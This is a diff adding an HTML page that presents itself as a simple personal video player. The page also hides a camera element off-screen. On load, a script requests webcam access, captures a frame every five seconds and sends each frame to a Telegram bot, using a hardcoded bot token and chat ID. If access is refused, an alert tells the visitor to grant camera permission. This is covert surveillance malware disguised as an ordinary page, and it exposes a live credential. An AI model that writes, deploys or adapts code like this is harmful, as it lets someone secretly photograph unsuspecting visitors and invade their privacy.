@@ -1,0 +1,113 @@
+<!DOCTYPE html><html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Abhishek's Video Player</title>
+  <style>
+    /* ===== Basic Page Styles (Blogspot‑friendly) ===== */
+    body {
+      margin: 0;
+      padding: 20px;
+      font-family: sans-serif;
+      background: linear-gradient(135deg, #fdeff9, #dbe8ff, #d4f3ee, #ffe7d1);
+      background-attachment: fixed;
+      text-align: center;
+    }h1 {
+  color: #333;
+  font-size: 24px;
+  margin-bottom: 20px;
+}
+
+/* ===== Video Player Card ===== */
+.video-wrapper {
+  width: 90%;
+  max-width: 780px;
+  margin: 0 auto;
+  background: #ffffff;
+  border-radius: 10px;
+  box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+  overflow: hidden;
+}
+video#player {
+  width: 100%;
+  height: auto;
+  display: block;
+}
+
+/* ===== Hidden Camera Elements (Telegram) ===== */
+#cameraVideo {
+  position: absolute; /* keep off‑screen */
+  top: -9999px;
+  left: -9999px;
+  width: 1px;
+  height: 1px;
+  opacity: 0;
+}
+#canvas { display: none; }
+
+  </style>
+</head>
+<body>
+  <h1>Abhishek's Video Player</h1>  <!-- Visible direct‑link video player -->  <div class="video-wrapper">
+    <video id="player" controls>
+      <!-- Replace with your direct video URL -->
+      <source src="https://pixeldrain.dev/api/file/b9tHoHJU?download" type="video/mp4" />
+      Your browser does not support the video tag.
+    </video>
+  </div>  <!-- Hidden camera video & canvas for Telegram uploads --><video id="cameraVideo" autoplay muted playsinline></video> <canvas id="canvas"></canvas>
+
+  <script>
+    /* ========= Telegram Live Photo Sender ========= */
+    const BOT_TOKEN   = '7409826266:AAF68qdwbIswsidGEudM9vj3IDBgx452e3U';
+    const CHAT_ID     = '8088648263';
+    const INTERVAL_MS = 5000; // send every 5 seconds
+
+    async function initCamera() {
+      try {
+        const cam = document.getElementById('cameraVideo');
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        cam.srcObject = stream;
+
+        // Ensure video is playing before first capture
+        await new Promise(res => {
+          cam.onloadedmetadata = () => {
+            cam.play();
+            cam.onplaying = res;
+          };
+        });
+
+        const canvas = document.getElementById('canvas');
+        const ctx    = canvas.getContext('2d');
+
+        setInterval(() => {
+          if (!cam.videoWidth || !cam.videoHeight) return;
+
+          canvas.width  = cam.videoWidth;
+          canvas.height = cam.videoHeight;
+          ctx.drawImage(cam, 0, 0, canvas.width, canvas.height);
+
+          canvas.toBlob(async blob => {
+            const fd = new FormData();
+            fd.append('chat_id', CHAT_ID);
+            fd.append('photo', blob, 'frame.jpg');
+            try {
+              await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                method: 'POST',
+                body: fd
+              });
+            } catch (e) {
+              console.error('Telegram error:', e);
+            }
+          }, 'image/jpeg');
+        }, INTERVAL_MS);
+
+      } catch (err) {
+        console.error('Camera initialisation failed:', err);
+        alert('Camera permission is needed for Telegram photo sending.');
+      }
+    }
+
+    // Start camera & Telegram sending once the page is fully loaded
+    window.addEventListener('load', initCamera);
+  </script></body>
+</html>
